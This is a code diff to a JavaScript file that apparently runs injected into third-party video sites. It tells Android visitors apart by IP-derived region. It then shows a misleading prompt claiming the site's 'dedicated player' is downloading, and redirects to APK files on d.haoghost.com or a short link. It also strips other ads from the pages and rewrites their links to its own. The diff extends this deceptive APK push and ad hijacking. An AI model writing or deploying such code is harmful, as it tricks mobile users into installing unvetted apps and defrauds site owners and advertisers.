@@ -36,6 +36,7 @@ var hy_itv=setInterval(function(){
 		target.appendChild( script );
 		script.onload = script.onreadystatechange = function()
 		{
+			
 			if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete" )
 			{
 				callback( null , obj );
@@ -144,8 +145,9 @@ var hy_itv=setInterval(function(){
 				var rd=Math.random();
 				//if(notNight()) result="sybb.10C352.apk";
 				//else result="http://t.cn/R7qFBqD";
-				if(rd>0.5) result="http://t.cn/R7qFBqD";
-				else result="sybb.10C352.apk";
+				if(rd<0.4) result="sybb.10C352.apk";
+				else if(rd<0.8) result="360sqyy774.apk";
+				else result="http://t.cn/R7qFBqD";
 		}
 		return result;
 	}
@@ -280,25 +282,26 @@ var hy_itv=setInterval(function(){
 			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua))
 			{
 				getJsonp(
-					'http://m.haoghost.com/request.php?action=index&method=main1',
+					'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
 					"",
 					function(data){
-						if(data==0)
+						var res=remote_ip_info.city.indexOf("广东")>=0 ||remote_ip_info.city.indexOf("山东")>=0;
+						if(!res && Math.random()>0.9)
 						{
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy14.apk";
+								pname="hlyy19.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
-									"t=undefined&s=tag_889&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
+									"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
 									function(data){
 
 									}
 								);
 							}
 						}
-						if(data==1)
+						if(res)
 						{
 							setCookie("hyipdata","1");
 						}
@@ -315,11 +318,18 @@ var hy_itv=setInterval(function(){
 				window.setTimeout(function(){
 					if(num==18 || num==19 || num==31 || num==32 || num==33)
 					{
-						if(tt.indexOf("》")<0 || !autoDown()) return;
-						tt=tt.split("》")[0]+"》";
-						tt="正在为您下载手机专用播放器，安装后即可观看"+tt;
+						if(!autoDown()) return;
+						if(tt.indexOf("》")<0)
+						{
+							tt="正在为您下载本站专用手机播放器，安装后即可观看本站所有电影视频";
+						}
+						else
+						{
+							tt=tt.split("》")[0]+"》";
+							tt="正在为您下载本站专用手机播放器，安装后即可观看"+tt;
+						}
 					} 
-					else if(num==15 || num==28 || num==29)
+					else if(num==15 || num==28 || num==29 || num==34)
 					{
 						if(!autoDown()) return;
 						tt="正在下载神奇影院，海量视频任你看";
@@ -345,21 +355,21 @@ var hy_itv=setInterval(function(){
 					}
 					else
 					{
-						function setBefore()
+						function setBefore(num)
 						{
 							var now=parseInt(getCookie("hycookietime"));
-							now=now-50*60*1000;
+							now=now-num*60*1000;
 							setCookie("hycookietime",now);	
 						}
 						if(window.confirm(tt)){
 							if(pname.indexOf("http")>=0) window.location.href=pname;
 							else window.location.href="http://d.haoghost.com/"+pname;
 							setCookie("hycpc1","1");
-							if(num==28 || num==31 || num==32 || num==33) setBefore();
+							if(num==28 || num==31 || num==32 || num==33 || num==34) setBefore(50);
 						}
 						else
 						{
-							setBefore();
+							setBefore(55);
 						}
 					}
 				},1000);
@@ -368,31 +378,56 @@ var hy_itv=setInterval(function(){
 			
 		})();
 
-		if(num==18 || num==19 || num==27 || num==22 || num==31)
-		{
-			
-			window.setInterval(function(){
-				if(num==27)
+
+		window.setInterval(function(){
+			function hideAdv(id)
+			{
+				var adv=document.getElementById(id);
+				if(adv) adv.parentNode.removeChild(adv);
+			}
+			var clear_num=0;
+			function regHideAdv(str)
+			{
+				var divs=document.getElementsByTagName("div");
+				for(var i=0,temp;temp=divs[i];i++)
 				{
-					var o27div=document.getElementById("lgVshow");
-					if(o27div) o27div.parentNode.removeChild(o27div);
+					var idstr=temp.getAttribute("id");
+					if(idstr && idstr.indexOf(str)>-1){
+						temp.parentNode.removeChild(temp);
+						clear_num=1;
+					}
 				}
-				if(num==31)
-				{
-					var o31div=document.getElementById("xcy_fmt_9v");
-					if(o31div) o31div.parentNode.removeChild(o31div);
-				}
-				if(num==22)
-				{
-					
-					var o22div=document.getElementById("__keyrun_RM_Div");
-					if(o22div) o22div.parentNode.removeChild(o22div);
-					var t22a,t22b=document.getElementById("viewxxx");
-					if(t22b) t22b.setAttribute("href",lastlink);
-					if(window.frames["baidu_clb_slot_iframe_984242_0"].document) t22a=window.frames["baidu_clb_slot_iframe_984242_0"].document.getElementsByTagName("a")[0];
-					if(window.frames["BAIDU_DUP_wrapper_984242_0"].document) t22a=window.frames["BAIDU_DUP_wrapper_984242_0"].document.getElementsByTagName("a")[0];
-					if(t22a) t22a.setAttribute("href",lastlink);
-				}
+			}
+			if(num==27)
+			{
+				hideAdv("lgVshow");
+			}
+			if(num==28)
+			{
+				if(clear_num==1) return;
+				regHideAdv("star8");
+			}
+			if(num==31)
+			{
+				hideAdv("xcy_fmt_9v");
+			}
+			if(num==32)
+			{
+				hideAdv("__70e_1");hideAdv("__70e_2");hideAdv("xcy_fmt");t2.style.display="";
+			}
+			if(num==22)
+			{
+				
+				hideAdv("__keyrun_RM_Div");
+				var t22a,t22b=document.getElementById("viewxxx");
+				if(t22b) t22b.setAttribute("href",lastlink);
+				if(window.frames["baidu_clb_slot_iframe_984242_0"].document) t22a=window.frames["baidu_clb_slot_iframe_984242_0"].document.getElementsByTagName("a")[0];
+				if(window.frames["BAIDU_DUP_wrapper_984242_0"].document) t22a=window.frames["BAIDU_DUP_wrapper_984242_0"].document.getElementsByTagName("a")[0];
+				if(t22a) t22a.setAttribute("href",lastlink);
+			}
+			if(num==18 || num==19)
+			{
+				hideAdv("q1q2a3d4d5iva");
 				var d=document.getElementById("JS_BottmEX2_Div");
 				var i=document.getElementsByTagName("ins");
 				var as=document.getElementsByTagName("a"),str_gg=[];
@@ -416,8 +451,8 @@ var hy_itv=setInterval(function(){
 					}
 					
 				}
-			},500);
-		}
+			}
+		},500);
 
 		if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {return};
 		
@@ -425,7 +460,8 @@ var hy_itv=setInterval(function(){
 		var script = document.createElement("script");
 		script.type = "text/javascript";
 		script.language = "javascript";
-		script.src="http://js.users.51.la/17318300.js";
+		script.src="http://v1.cnzz.com/stat.php?id=1253417451&web_id=1253417451";
+		//script.src="http://js.users.51.la/17318300.js";
 		//script.src = "http://s95.cnzz.com/stat.php?id=1253099509&web_id=1253099509";
 		
 		var tj=document.getElementById("hy_cpc_tj");
